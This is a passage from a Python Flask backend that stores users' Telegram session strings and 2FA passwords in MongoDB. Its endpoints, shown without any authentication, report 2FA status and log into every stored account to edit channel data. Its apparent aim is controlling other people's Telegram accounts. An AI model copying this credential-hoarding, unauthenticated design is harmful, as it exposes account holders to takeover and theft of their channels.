        logger.error(f"Error getting transfer stats: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/check_user_2fa_status', methods=['GET'])
def check_user_2fa_status():
    user_id = request.args.get("user_id")
    if not user_id:
        return jsonify({"success": False, "error": "user_id is required"}), 400

    try:
        session_data = collection.find_one({"user_id": user_id})
        if not session_data:
            return jsonify({"success": False, "error": "User session not found"}), 404

        has_2fa_password = session_data.get("2fa_password") is not None
        has_2fa = session_data.get("has_2fa", False)

        return jsonify({
            "success": True,
            "has_2fa_stored": has_2fa_password,
            "has_2fa": has_2fa,
            "user_id": user_id
        })
    except Exception as e:
        logger.error(f"Error checking 2FA status: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


# ----------------------------------------------------------------------
# One-shot backfill endpoint to fix existing (bad) created_at values
# ----------------------------------------------------------------------
@app.route('/backfill_channel_years', methods=['POST'])
def backfill_channel_years():
    """
    Re-fetch every stored channel for a given user (or all users if no
    user_id is provided) and fix the created_year / created_at fields in
    MongoDB using the real Telegram creation dates.

    Body (optional):
      { "user_id": "..." }   -> only that user
      { }                    -> every user with a session_string
    """
    data = request.json or {}
    only_user = data.get("user_id")

    try:
        query = {"session_string": {"$exists": True, "$ne": None}}
        if only_user:
            query["user_id"] = only_user

        sessions = list(collection.find(query, {"user_id": 1, "session_string": 1}))
        if not sessions:
            return jsonify({"success": False, "error": "No sessions found to backfill"}), 404

        results = []

        for s in sessions:
            user_id = s.get("user_id")
            session_string = s.get("session_string")
            if not user_id or not session_string:
                continue

            new_loop = asyncio.new_event_loop()
            asyncio.set_event_loop(new_loop)
            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)

            async def fix_one():
                try:
                    await client.connect()
                    if not await client.is_user_authorized():
                        return {"user_id": user_id, "success": False, "error": "not authorized"}

                    dialogs = await client.get_dialogs()
                    me = await client.get_me()
                    fixed = 0
                    scanned = 0

                    for dialog in dialogs:
                        if not (dialog.is_channel or dialog.is_group):
                            continue
                        scanned += 1
                        entity = dialog.entity

                        # only touch channels the user owns/admins
                        try:
                            rights = await client.get_permissions(entity, me)
                        except Exception:
                            continue
                        if not rights or not (getattr(rights, 'is_creator', False) or getattr(rights, 'is_admin', False)):
                            continue

                        created_year, created_at_unix = extract_channel_dates(entity, dialog)
                        if created_year is None:
                            continue

                        # Update the matching channel entry inside user_channels
                        session_doc = collection.find_one({"user_id": user_id})
                        if not session_doc:
                            continue
                        channels = session_doc.get("user_channels", [])
                        changed = False
                        for ch in channels:
                            if ch.get("channel_id") == entity.id:
                                ch["created_year"] = created_year
                                ch["created_at"] = created_at_unix
                                changed = True
                                break
                        if changed:
                            collection.update_one(
                                {"user_id": user_id},
                                {"$set": {"user_channels": channels}}
                            )
                            fixed += 1

                    return {"user_id": user_id, "success": True, "scanned": scanned, "fixed": fixed}
                except Exception as e:
                    return {"user_id": user_id, "success": False, "error": str(e)}
                finally:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass

            res = new_loop.run_until_complete(fix_one())
            results.append(res)

        return jsonify({"success": True, "results": results})

    except Exception as e:
        logger.error(f"Error in backfill_channel_years: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "ok", "service": "tg-back-2"}), 200


# ============ CHANGED: PORT binding for Railway ============
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
# ============================================================
